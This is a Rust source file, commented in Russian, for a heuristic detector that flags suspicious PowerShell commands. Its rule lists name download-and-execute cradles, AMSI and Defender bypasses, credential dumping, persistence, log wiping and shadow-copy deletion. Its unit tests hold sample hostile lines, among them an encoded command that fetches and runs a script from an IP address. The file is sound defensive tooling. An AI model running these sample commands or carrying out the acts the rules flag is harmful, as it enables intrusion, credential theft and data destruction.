// analyzer.rs - эвристический поиск подозрительных PowerShell-команд.
// Без внешних зависимостей. Это эвристика: она подсвечивает то, на что стоит
// посмотреть глазами, и не заменяет EDR/антивирус. Ложные срабатывания возможны
// (например, администраторы тоже пользуются Invoke-WebRequest).

use std::collections::HashSet;

pub struct Finding {
    pub sev: u8, // 1 - низкая, 2 - средняя, 3 - высокая
    pub title: String,
}

pub struct Analysis {
    pub findings: Vec<Finding>,
    pub decoded: Vec<String>, // раскодированные Base64-вставки
    pub urls: Vec<String>,
    pub level: u8, // 0 - чисто, 1..3
}

impl Analysis {
    pub fn level_name(&self) -> &'static str {
        match self.level {
            3 => "ВЫСОКИЙ",
            2 => "СРЕДНИЙ",
            1 => "НИЗКИЙ",
            _ => "",
        }
    }
}

struct Rule {
    needle: &'static str, // в нижнем регистре, пробелы схлопнуты, обратные кавычки убраны
    word: bool,           // искать только как отдельное слово
    sev: u8,
    cat: &'static str,
    title: &'static str,
}

const fn r(needle: &'static str, word: bool, sev: u8, cat: &'static str, title: &'static str) -> Rule {
    Rule { needle, word, sev, cat, title }
}

const RULES: &[Rule] = &[
    // --- скачивание ---
    r("downloadstring", false, 2, "download", "Скачивание текста из сети (DownloadString)"),
    r("downloadfile", false, 2, "download", "Скачивание файла (DownloadFile)"),
    r("downloaddata", false, 2, "download", "Скачивание данных (DownloadData)"),
    r("invoke-webrequest", false, 2, "download", "Invoke-WebRequest"),
    r("iwr", true, 2, "download", "Invoke-WebRequest (алиас iwr)"),
    r("invoke-restmethod", false, 2, "download", "Invoke-RestMethod"),
    r("irm", true, 2, "download", "Invoke-RestMethod (алиас irm)"),
    r("net.webclient", false, 2, "download", "System.Net.WebClient"),
    r("start-bitstransfer", false, 2, "download", "Скачивание через BITS (Start-BitsTransfer)"),
    r("bitsadmin", true, 2, "download", "bitsadmin (часто для скачивания)"),
    r("-urlcache", false, 3, "download", "certutil -urlcache (скачивание через certutil)"),
    r("wget", true, 2, "download", "wget"),
    r("curl", true, 2, "download", "curl"),
    r("system.net.http.httpclient", false, 1, "download", "HttpClient"),
    // --- выполнение строк как кода ---
    r("invoke-expression", false, 2, "exec", "Invoke-Expression (выполнение строки как кода)"),
    r("iex", true, 2, "exec", "iex (выполнение строки как кода)"),
    r("[scriptblock]::create", false, 2, "exec", "Динамическое создание ScriptBlock"),
    // --- Base64 / сжатие ---
    r("frombase64string", false, 2, "base64", "Декодирование Base64 (FromBase64String)"),
    r("tobase64string", false, 1, "", "Кодирование в Base64"),
    r("gzipstream", false, 2, "base64", "Распаковка GZip в коде"),
    r("deflatestream", false, 2, "base64", "Распаковка Deflate в коде"),
    // --- скрытность и обход политик ---
    r("-windowstyle hidden", false, 2, "hidden", "Скрытое окно (-WindowStyle Hidden)"),
    r("-w hidden", false, 2, "hidden", "Скрытое окно (-w hidden)"),
    r("-win hidden", false, 2, "hidden", "Скрытое окно (-win hidden)"),
    r("-executionpolicy bypass", false, 2, "bypass", "Обход ExecutionPolicy (Bypass)"),
    r("-exec bypass", false, 2, "bypass", "Обход ExecutionPolicy (Bypass)"),
    r("-ep bypass", false, 2, "bypass", "Обход ExecutionPolicy (Bypass)"),
    r("-ex bypass", false, 2, "bypass", "Обход ExecutionPolicy (Bypass)"),
    r("set-executionpolicy unrestricted", false, 1, "", "Ослабление ExecutionPolicy (Unrestricted)"),
    r("-nop", true, 1, "evasion", "Запуск без профиля (-NoProfile)"),
    r("-noprofile", false, 1, "evasion", "Запуск без профиля (-NoProfile)"),
    // --- AMSI / Defender ---
    r("amsiutils", false, 3, "amsi", "Обход AMSI (AmsiUtils)"),
    r("amsiinitfailed", false, 3, "amsi", "Обход AMSI (amsiInitFailed)"),
    r("amsicontext", false, 3, "amsi", "Манипуляции с AMSI (amsiContext)"),
    r("-disablerealtimemonitoring", false, 3, "defense", "Отключение защиты Defender в реальном времени"),
    r("disableantispyware", false, 3, "defense", "Отключение антишпионского модуля Defender"),
    r("-exclusionpath", false, 3, "defense", "Добавление исключения в Defender (путь)"),
    r("-exclusionextension", false, 3, "defense", "Добавление исключения в Defender (расширение)"),
    r("-exclusionprocess", false, 3, "defense", "Добавление исключения в Defender (процесс)"),
    r("sc stop windefend", false, 3, "defense", "Остановка службы Defender"),
    // --- инъекции, работа с памятью ---
    r("[reflection.assembly]::load", false, 3, "reflect", "Загрузка сборки из памяти (Assembly.Load)"),
    r("reflection.assembly", false, 2, "reflect", "Reflection.Assembly"),
    r("virtualalloc", false, 3, "reflect", "VirtualAlloc (выделение памяти под шеллкод)"),
    r("virtualprotect", false, 2, "reflect", "VirtualProtect"),
    r("createthread", false, 3, "reflect", "CreateThread (запуск кода в потоке)"),
    r("writeprocessmemory", false, 3, "reflect", "WriteProcessMemory (инъекция в процесс)"),
    r("getdelegateforfunctionpointer", false, 3, "reflect", "Вызов нативного кода по указателю"),
    r("getprocaddress", false, 2, "reflect", "GetProcAddress"),
    r("dllimport", false, 2, "reflect", "Импорт функций из DLL (P/Invoke)"),
    r("add-type", false, 1, "", "Add-Type (компиляция C# на лету)"),
    // --- учётные данные и разведка ---
    r("mimikatz", false, 3, "cred", "Mimikatz"),
    r("sekurlsa", false, 3, "cred", "Команды Mimikatz (sekurlsa)"),
    r("lsass", false, 3, "cred", "Обращение к LSASS"),
    r("minidump", false, 3, "cred", "MiniDump (дамп памяти процесса)"),
    r("ntds.dit", false, 3, "cred", "Доступ к ntds.dit"),
    r("hklm\\sam", false, 3, "cred", "Доступ к кусту реестра SAM"),
    r("procdump", false, 2, "cred", "ProcDump"),
    r("kerberoast", false, 3, "cred", "Kerberoasting"),
    r("sharphound", false, 3, "recon", "SharpHound (разведка AD)"),
    r("bloodhound", false, 3, "recon", "BloodHound (разведка AD)"),
    r("-asplaintext", false, 2, "", "ConvertTo-SecureString -AsPlainText (пароль в открытом виде)"),
    r("nltest /domain_trusts", false, 2, "recon", "Разведка доверий домена (nltest)"),
    r("whoami /priv", false, 1, "recon", "Проверка привилегий (whoami /priv)"),
    r("adfind", true, 2, "recon", "AdFind (разведка AD)"),
    // --- закрепление ---
    r("schtasks /create", false, 2, "persist", "Создание задачи планировщика (schtasks)"),
    r("register-scheduledtask", false, 2, "persist", "Создание задачи планировщика"),
    r("new-scheduledtask", false, 1, "persist", "Создание задачи планировщика"),
    r("currentversion\\run", false, 2, "persist", "Автозапуск через ключ реестра Run"),
    r("new-service", false, 1, "persist", "Создание службы"),
    r("register-wmievent", false, 2, "persist", "Подписка на WMI-события"),
    r("__eventfilter", false, 3, "persist", "WMI-подписка (EventFilter): постоянное закрепление"),
    r("commandlineeventconsumer", false, 3, "persist", "WMI-подписка (CommandLineEventConsumer)"),
    // --- затирание следов ---
    r("clear-eventlog", false, 3, "antiforensics", "Очистка журналов событий (Clear-EventLog)"),
    r("wevtutil cl", false, 3, "antiforensics", "Очистка журнала (wevtutil cl)"),
    r("wevtutil clear-log", false, 3, "antiforensics", "Очистка журнала (wevtutil clear-log)"),
    r("remove-eventlog", false, 3, "antiforensics", "Удаление журнала событий"),
    r("limit-eventlog", false, 2, "antiforensics", "Ограничение журнала событий"),
    r("-historysavestyle savenothing", false, 3, "antiforensics", "Отключение сохранения истории PSReadLine"),
    r("consolehost_history", false, 2, "antiforensics", "Обращение к файлу истории PowerShell"),
    r("clear-history", false, 1, "antiforensics", "Очистка истории сессии"),
    r("deletejournal", false, 3, "antiforensics", "Удаление журнала USN"),
    r(".creationtime =", false, 2, "antiforensics", "Подмена времени создания файла (timestomp)"),
    r(".lastwritetime =", false, 2, "antiforensics", "Подмена времени изменения файла (timestomp)"),
    // --- удалённое выполнение ---
    r("enter-pssession", false, 1, "lateral", "Удалённая сессия (Enter-PSSession)"),
    r("new-pssession", false, 1, "lateral", "Удалённая сессия (New-PSSession)"),
    r("invoke-command -computername", false, 2, "lateral", "Удалённое выполнение (Invoke-Command)"),
    r("psexec", false, 2, "lateral", "PsExec"),
    r("wmic /node", false, 2, "lateral", "Удалённое выполнение через WMIC"),
    r("invoke-wmimethod", false, 2, "lateral", "Invoke-WmiMethod"),
    r("invoke-smbexec", false, 3, "lateral", "SMBExec"),
    r("invoke-dcom", false, 3, "lateral", "DCOM-выполнение"),
    // --- обратные оболочки ---
    r("net.sockets.tcpclient", false, 3, "revshell", "TCP-клиент (возможна обратная оболочка)"),
    r("net.sockets.tcplistener", false, 2, "revshell", "TCP-сервер"),
    r("ncat", true, 2, "revshell", "ncat"),
    r("nc.exe", false, 2, "revshell", "nc.exe"),
    // --- учётные записи ---
    r("net localgroup administrators", false, 3, "account", "Изменение группы администраторов"),
    r("add-localgroupmember", false, 3, "account", "Добавление в локальную группу"),
    r("new-localuser", false, 2, "account", "Создание локального пользователя"),
    r("/add", true, 1, "account", "Добавление объекта (/add)"),
    // --- разрушительные действия ---
    r("vssadmin delete shadows", false, 3, "ransom", "Удаление теневых копий (vssadmin)"),
    r("vssadmin resize shadowstorage", false, 3, "ransom", "Урезание теневых копий"),
    r("shadowcopy delete", false, 3, "ransom", "Удаление теневых копий (WMIC)"),
    r("recoveryenabled no", false, 3, "ransom", "Отключение среды восстановления (bcdedit)"),
    r("wbadmin delete", false, 3, "ransom", "Удаление резервных копий (wbadmin)"),
    r("cipher /w", false, 2, "ransom", "Затирание свободного места (cipher /w)"),
    r("sdelete", false, 2, "ransom", "SDelete (безвозвратное удаление)"),
];

/// Хосты, которые часто используют для раздачи нагрузки.
const SUSPICIOUS_HOSTS: &[(&str, u8)] = &[
    ("pastebin.com", 2),
    ("paste.ee", 2),
    ("hastebin", 2),
    ("transfer.sh", 2),
    ("anonfiles", 2),
    ("temp.sh", 2),
    ("ngrok", 2),
    ("trycloudflare.com", 2),
    ("workers.dev", 2),
    ("duckdns.org", 2),
    ("no-ip", 2),
    ("discordapp.com/attachments", 2),
    ("cdn.discordapp.com", 2),
    ("bit.ly", 2),
    ("tinyurl.com", 2),
    ("is.gd", 2),
    ("raw.githubusercontent.com", 1),
];

// ---------- нормализация и поиск ----------

fn normalize(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut last_space = false;
    for c in text.chars() {
        if c == '`' {
            continue;
        }
        let c = if c.is_whitespace() { ' ' } else { c };
        if c == ' ' {
            if last_space {
                continue;
            }
            last_space = true;
        } else {
            last_space = false;
        }
        for lc in c.to_lowercase() {
            out.push(lc);
        }
    }
    out
}

fn is_word_char(c: char) -> bool {
    c.is_alphanumeric() || c == '_' || c == '-'
}

fn has(l: &str, needle: &str, word: bool) -> bool {
    if !word {
        return l.contains(needle);
    }
    let mut start = 0;
    while let Some(p) = l[start..].find(needle) {
        let s = start + p;
        let e = s + needle.len();
        let before_ok = l[..s].chars().next_back().map_or(true, |c| !is_word_char(c));
        let after_ok = l[e..].chars().next().map_or(true, |c| !is_word_char(c));
        if before_ok && after_ok {
            return true;
        }
        start = e;
    }
    false
}

// ---------- Base64 ----------

fn is_b64(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '='
}

fn b64_val(c: u8) -> Option<u32> {
    match c {
        b'A'..=b'Z' => Some((c - b'A') as u32),
        b'a'..=b'z' => Some((c - b'a') as u32 + 26),
        b'0'..=b'9' => Some((c - b'0') as u32 + 52),
        b'+' | b'-' => Some(62),
        b'/' | b'_' => Some(63),
        _ => None,
    }
}

fn b64_decode(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    let mut buf = 0u32;
    let mut bits = 0u32;
    for &c in s.as_bytes() {
        if c == b'=' {
            break;
        }
        let v = b64_val(c)?;
        buf = ((buf << 6) | v) & 0xFFFFFF;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push(((buf >> bits) & 0xFF) as u8);
        }
    }
    Some(out)
}

fn looks_utf16(bytes: &[u8]) -> bool {
    let pairs = bytes.len() / 2;
    if pairs == 0 {
        return false;
    }
    let zeros = bytes.iter().skip(1).step_by(2).filter(|&&b| b == 0).count();
    zeros * 10 >= pairs * 6
}

/// Декодирует Base64 и возвращает текст, только если внутри читаемая строка
/// (UTF-16LE, как делает -EncodedCommand, или UTF-8).
fn decode_b64_text(s: &str) -> Option<String> {
    let bytes = b64_decode(s)?;
    if bytes.len() < 4 {
        return None;
    }
    let text = if bytes.len() % 2 == 0 && looks_utf16(&bytes) {
        let u: Vec<u16> = bytes.chunks(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
        String::from_utf16(&u).ok()
    } else {
        String::from_utf8(bytes).ok()
    }?;
    let total = text.chars().count();
    if total == 0 {
        return None;
    }
    let good = text.chars().filter(|c| !c.is_control() || matches!(c, '\n' | '\r' | '\t')).count();
    if good * 100 < total * 90 {
        return None;
    }
    Some(text.trim_start_matches('\u{feff}').to_string())
}

// ---------- URL ----------

fn extract_urls(text: &str) -> Vec<String> {
    let lower = text.to_ascii_lowercase();
    let mut res: Vec<String> = Vec::new();
    for scheme in ["http://", "https://", "ftp://"] {
        let mut start = 0;
        while let Some(p) = lower[start..].find(scheme) {
            let s = start + p;
            let rest = &text[s..];
            let end = rest
                .find(|c: char| c.is_whitespace() || "'\"()<>,;|`".contains(c))
                .unwrap_or(rest.len());
            let url = rest[..end].trim_end_matches(['.', ')', ']']).to_string();
            if !url.is_empty() && !res.contains(&url) {
                res.push(url);
            }
            start = s + scheme.len();
        }
    }
    res.truncate(10);
    res
}

fn url_host(url: &str) -> &str {
    let after = url.split("://").nth(1).unwrap_or(url);
    after.split(|c| c == '/' || c == ':' || c == '?' || c == '#').next().unwrap_or("")
}

fn is_ipv4(host: &str) -> bool {
    let parts: Vec<&str> = host.split('.').collect();
    parts.len() == 4 && parts.iter().all(|p| !p.is_empty() && p.len() <= 3 && p.chars().all(|c| c.is_ascii_digit()))
}

// ---------- анализ ----------

struct Ctx {
    a: Analysis,
    seen: HashSet<String>,
    seen_dec: HashSet<String>,
}

impl Ctx {
    fn add(&mut self, sev: u8, title: String) {
        if self.seen.insert(title.clone()) {
            self.a.findings.push(Finding { sev, title });
        }
    }
}

pub fn analyze(text: &str) -> Analysis {
    let mut ctx = Ctx {
        a: Analysis { findings: Vec::new(), decoded: Vec::new(), urls: Vec::new(), level: 0 },
        seen: HashSet::new(),
        seen_dec: HashSet::new(),
    };
    inner(text, 0, &mut ctx, "");
    let a = &mut ctx.a;
    a.findings.sort_by(|x, y| y.sev.cmp(&x.sev));
    let max = a.findings.iter().map(|f| f.sev).max().unwrap_or(0);
    let sum: u32 = a.findings.iter().map(|f| f.sev as u32).sum();
    a.level = if max >= 3 {
        3
    } else if max == 2 || sum >= 3 {
        2
    } else if max == 1 {
        1
    } else {
        0
    };
    ctx.a
}

fn inner(text: &str, depth: u32, ctx: &mut Ctx, prefix: &str) {
    let l = normalize(text);

    // правила и их категории
    let mut cats: HashSet<&'static str> = HashSet::new();
    for rule in RULES {
        if has(&l, rule.needle, rule.word) {
            if !rule.cat.is_empty() {
                cats.insert(rule.cat);
            }
            ctx.add(rule.sev, format!("{}{}", prefix, rule.title));
        }
    }

    // комбинации сильнее отдельных признаков
    if cats.contains("download") && cats.contains("exec") {
        ctx.add(3, format!("{}Скачивание и выполнение кода (download cradle)", prefix));
    }
    if cats.contains("base64") && cats.contains("exec") {
        ctx.add(3, format!("{}Декодирование Base64 и выполнение (IEX из Base64)", prefix));
    }
    if cats.contains("download") && (cats.contains("hidden") || cats.contains("bypass")) {
        ctx.add(3, format!("{}Скрытое скачивание с обходом политик", prefix));
    }
    if cats.contains("amsi") && cats.contains("reflect") {
        ctx.add(3, format!("{}Обход AMSI вместе с работой с памятью", prefix));
    }

    // простые признаки обфускации
    if l.matches("[char]").count() >= 6 {
        ctx.add(2, format!("{}Сборка строки из кодов символов ([char])", prefix));
    }
    if l.matches("'+'").count() >= 4 || l.matches("\"+\"").count() >= 4 {
        ctx.add(2, format!("{}Склейка строк по кусочкам (обфускация)", prefix));
    }
    let chars: Vec<char> = text.chars().collect();
    let ticks = (1..chars.len().saturating_sub(1))
        .filter(|&i| chars[i] == '`' && chars[i - 1].is_alphabetic() && chars[i + 1].is_alphabetic())
        .count();
    if ticks >= 4 {
        ctx.add(2, format!("{}Обфускация обратными кавычками внутри слов", prefix));
    }

    // -EncodedCommand (допускаются сокращения: -e, -ec, -enc ...)
    let toks: Vec<&str> = text
        .split_whitespace()
        .map(|t| t.trim_matches(|c| c == '"' || c == '\''))
        .collect();
    for i in 0..toks.len() {
        let t = toks[i].to_ascii_lowercase();
        if t.len() >= 2 && t.starts_with('-') && "encodedcommand".starts_with(&t[1..]) && i + 1 < toks.len() {
            let b = toks[i + 1];
            if b.len() >= 8 && b.chars().all(is_b64) {
                ctx.seen_dec.insert(b.to_string());
                match decode_b64_text(b) {
                    Some(d) => {
                        ctx.add(3, format!("{}Закодированная команда (-EncodedCommand)", prefix));
                        recurse_decoded(d, depth, ctx);
                    }
                    None => ctx.add(3, format!("{}Закодированная команда (-EncodedCommand), расшифровать не удалось", prefix)),
                }
            }
        }
    }

    // любые другие длинные Base64-вставки
    let mut runs: Vec<String> = Vec::new();
    let mut run = String::new();
    for c in text.chars().chain(std::iter::once(' ')) {
        if is_b64(c) {
            run.push(c);
        } else {
            if run.len() >= 24 {
                runs.push(std::mem::take(&mut run));
            } else {
                run.clear();
            }
        }
    }
    for rn in runs {
        if ctx.seen_dec.contains(&rn) {
            continue;
        }
        if rn.starts_with("H4sI") {
            ctx.seen_dec.insert(rn);
            ctx.add(3, format!("{}Base64 со сжатием GZip (содержимое скрыто)", prefix));
            continue;
        }
        if let Some(d) = decode_b64_text(&rn) {
            if d.chars().count() >= 6 {
                ctx.seen_dec.insert(rn);
                ctx.add(2, format!("{}Base64-строка с читаемым текстом внутри", prefix));
                recurse_decoded(d, depth, ctx);
            }
        }
    }

    // URL
    for url in extract_urls(text) {
        let host = url_host(&url).to_ascii_lowercase();
        if is_ipv4(&host) {
            ctx.add(2, format!("{}Ссылка на IP-адрес вместо имени ({})", prefix, host));
        }
        let lu = url.to_ascii_lowercase();
        for (h, sev) in SUSPICIOUS_HOSTS {
            if lu.contains(h) {
                ctx.add(*sev, format!("{}Ссылка на {}", prefix, h));
            }
        }
        if !ctx.a.urls.contains(&url) {
            ctx.a.urls.push(url);
        }
    }
}

fn recurse_decoded(d: String, depth: u32, ctx: &mut Ctx) {
    if depth >= 2 {
        return;
    }
    ctx.a.decoded.push(d.clone());
    inner(&d, depth + 1, ctx, "[в раскодированном] ");
}

#[cfg(test)]
mod tests {
    use super::*;

    fn b64(bytes: &[u8]) -> String {
        const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut s = String::new();
        for ch in bytes.chunks(3) {
            let b = [ch[0], *ch.get(1).unwrap_or(&0), *ch.get(2).unwrap_or(&0)];
            let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
            s.push(T[(n >> 18 & 63) as usize] as char);
            s.push(T[(n >> 12 & 63) as usize] as char);
            s.push(if ch.len() > 1 { T[(n >> 6 & 63) as usize] as char } else { '=' });
            s.push(if ch.len() > 2 { T[(n & 63) as usize] as char } else { '=' });
        }
        s
    }

    fn utf16_b64(s: &str) -> String {
        let mut v = Vec::new();
        for u in s.encode_utf16() {
            v.extend_from_slice(&u.to_le_bytes());
        }
        b64(&v)
    }

    #[test]
    fn encoded_command_is_decoded() {
        let cmd = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')";
        let line = format!("powershell -nop -w hidden -enc {}", utf16_b64(cmd));
        let a = analyze(&line);
        assert_eq!(a.level, 3);
        assert!(a.decoded.iter().any(|d| d.contains("DownloadString")));
        assert!(a.urls.iter().any(|u| u == "http://203.0.113.5/a.ps1"));
        assert!(a.findings.iter().any(|f| f.title.contains("IP-адрес")));
    }

    #[test]
    fn download_cradle() {
        let a = analyze("iwr http://example.test/x.ps1 | iex");
        assert_eq!(a.level, 3);
        assert!(a.findings.iter().any(|f| f.title.contains("download cradle")));
    }

    #[test]
    fn frombase64_with_iex() {
        let a = analyze("iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SGVsbG8gd29ybGQ=')))");
        assert_eq!(a.level, 3);
    }

    #[test]
    fn long_base64_utf8_text_is_found() {
        let payload = b64(b"Write-Host 'hello from payload'");
        let a = analyze(&format!("$x = '{}'", payload));
        assert!(a.level >= 2);
        assert!(a.decoded.iter().any(|d| d.contains("hello from payload")));
    }

    #[test]
    fn antiforensics() {
        assert_eq!(analyze("Set-PSReadLineOption -HistorySaveStyle SaveNothing").level, 3);
        assert_eq!(analyze("wevtutil cl Security").level, 3);
    }

    #[test]
    fn backticks_do_not_hide_commands() {
        assert!(analyze("i`n`v`o`k`e`-`e`x`p`r`e`s`s`i`o`n $s").level >= 2);
    }

    #[test]
    fn benign_commands_are_clean() {
        assert_eq!(analyze("Get-ChildItem C:\\Temp | Sort-Object Length").level, 0);
        assert_eq!(analyze("cd D:\\projects\\site; git status").level, 0);
        assert_eq!(
            analyze("$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]").level,
            0
        );
    }
}
